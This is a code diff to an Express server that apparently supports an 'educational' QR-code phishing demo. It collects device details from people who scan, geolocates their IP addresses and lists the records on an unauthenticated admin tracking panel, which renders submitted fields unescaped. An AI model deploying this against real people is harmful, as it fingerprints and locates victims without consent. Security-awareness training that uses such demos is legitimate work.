@@ -19,7 +19,7 @@ app.use((req, res, next) => {
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Función para obtener ubicación aproximada por IP
+// Función segura para obtener ubicación por IP sin romper el servidor
 function obtenerUbicacionPorIP(ip) {
     return new Promise((resolve) => {
         if (!ip || ip === '::1' || ip.startsWith('127.') || ip.startsWith('192.168.')) {
@@ -27,67 +27,79 @@ function obtenerUbicacionPorIP(ip) {
             return;
         }
 
-        https.get(`http://ip-api.com/json/${ip}?fields=status,country,city,query`, (res) => {
+        const req = https.get(`https://ipapi.co/${ip}/json/`, (res) => {
             let data = '';
             res.on('data', (chunk) => { data += chunk; });
             res.on('end', () => {
                 try {
                     const parsed = JSON.parse(data);
-                    if (parsed.status === 'success') {
+                    if (parsed && !parsed.error) {
                         resolve({
-                            ip: parsed.query,
+                            ip: ip,
                             ciudad: parsed.city || 'Desconocida',
-                            pais: parsed.country || 'Desconocido'
+                            pais: parsed.country_name || 'Desconocido'
                         });
                     } else {
                         resolve({ ip: ip, ciudad: 'No disponible', pais: 'Desconocido' });
                     }
                 } catch (e) {
-                    resolve({ ip: ip, ciudad: 'Error', pais: 'Desconocido' });
+                    resolve({ ip: ip, ciudad: 'No disponible', pais: 'Desconocido' });
                 }
             });
-        }).on('error', () => {
-            resolve({ ip: ip, ciudad: 'Error de red', pais: 'Desconocido' });
+        });
+
+        req.on('error', () => {
+            resolve({ ip: ip, ciudad: 'No disponible', pais: 'Desconocido' });
+        });
+        
+        req.setTimeout(3000, () => {
+            req.destroy();
+            resolve({ ip: ip, ciudad: 'Tiempo agotado', pais: 'Desconocido' });
         });
     });
 }
 
 // Endpoint POST para recibir telemetría y geolocalización
 app.post('/api/registrar', async (req, res) => {
-    const { tipo, modelo, hora, bateria, red, gpu } = req.body;
-    
-    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    if (ip && ip.includes(',')) {
-        ip = ip.split(',')[0].trim();
+    try {
+        const { tipo, modelo, hora, bateria, red, gpu } = req.body;
+        
+        let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+        if (ip && ip.includes(',')) {
+            ip = ip.split(',')[0].trim();
+        }
+
+        const geo = await obtenerUbicacionPorIP(ip);
+
+        const nuevoRegistro = {
+            modelo: modelo || 'Desconocido',
+            tipo: tipo || 'Desconocido',
+            hora: hora || new Date().toLocaleString(),
+            bateria: bateria || 'N/D',
+            red: red || 'N/D',
+            gpu: gpu || 'N/D',
+            ip: geo.ip,
+            ubicacion: `${geo.ciudad}, ${geo.pais}`
+        };
+
+        registrosCapturados.unshift(nuevoRegistro);
+        console.log(`[NUEVO REGISTRO] IP: ${geo.ip} (${geo.ciudad}) | Dispositivo: ${nuevoRegistro.modelo}`);
+        
+        res.status(200).json({ status: 'ok' });
+    } catch (error) {
+        console.error("Error en /api/registrar:", error);
+        res.status(500).json({ status: 'error' });
     }
-
-    const geo = await obtenerUbicacionPorIP(ip);
-
-    const nuevoRegistro = {
-        modelo: modelo || 'Desconocido',
-        tipo: tipo || 'Desconocido',
-        hora: hora || new Date().toLocaleString(),
-        bateria: bateria || 'N/D',
-        red: red || 'N/D',
-        gpu: gpu || 'N/D',
-        ip: geo.ip,
-        ubicacion: `${geo.ciudad}, ${geo.pais}`
-    };
-
-    registrosCapturados.unshift(nuevoRegistro);
-    console.log(`[NUEVO REGISTRO] IP: ${geo.ip} (${geo.ciudad}) | Dispositivo: ${nuevoRegistro.modelo}`);
-    
-    res.status(200).json({ status: 'ok' });
 });
 
-// Panel de Administración (/admin) con la nueva columna de IP y Ubicación
+// Panel de Administración (/admin) con IP y Ubicación
 app.get('/admin', (req, res) => {
     let filasHTML = registrosCapturados.map((reg, index) => `
         <tr style="border-bottom: 1px solid #333;">
             <td style="padding: 10px;">${registrosCapturados.length - index}</td>
             <td style="padding: 10px; color: #ec4899; font-weight: bold;">${reg.modelo}</td>
-            <td style="padding: 10px; color: #38bdf8; font-family: monospace; font-weight: bold;">${reg.ip}</td>
-            <td style="padding: 10px; color: #f472b6;">📍 ${reg.ubicacion}</td>
+            <td style="padding: 10px; color: #38bdf8; font-family: monospace; font-weight: bold;">${reg.ip || 'Local'}</td>
+            <td style="padding: 10px; color: #f472b6;">📍 ${reg.ubicacion || 'Desconocida'}</td>
             <td style="padding: 10px; color: #10b981;">🔋 ${reg.bateria}</td>
             <td style="padding: 10px; color: #f59e0b;">📶 ${reg.red}</td>
             <td style="padding: 10px; font-size: 11px; max-width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="${reg.gpu}">${reg.gpu}</td>
@@ -120,7 +132,7 @@ app.get('/admin', (req, res) => {
         <body>
             <div class="container">
                 <h1>🎯 Panel de Rastreo - Qishing Educativo</h1>
-                <p>Actualización automática en tiempo real con Geolocalización por IP.</p>
+                <p>Actualización automática en tiempo real con Geolocalización.</p>
                 
                 <div class="counter">Dispositivos analizados: ${registrosCapturados.length}</div>
 
